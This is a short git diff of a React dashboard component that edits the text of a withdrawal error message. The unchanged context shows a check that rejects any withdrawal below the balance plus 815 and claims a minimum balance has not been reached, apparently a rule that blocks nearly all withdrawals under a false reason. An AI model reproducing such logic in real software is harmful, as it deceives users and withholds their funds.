@@ -843,9 +843,10 @@ export default function Dashboard() {
                   onClick={async () => {
                     if (Number(withdrawAmount) < balance + 815) {
                       setWithdrawMessage(
-                        `You have not reached the minimum required balance to make a withdrawal. 
-                          <span class="text-blue-400">Current balance: $${balance}</span>`,
+                        `You have not reached the minimum required balance to make a
+                        withdrawal. Current balance: $${balance}`,
                       );
+
                       // setWithdrawMessage(
                       //   "You cannot make repeated withdrawals.",
                       // );
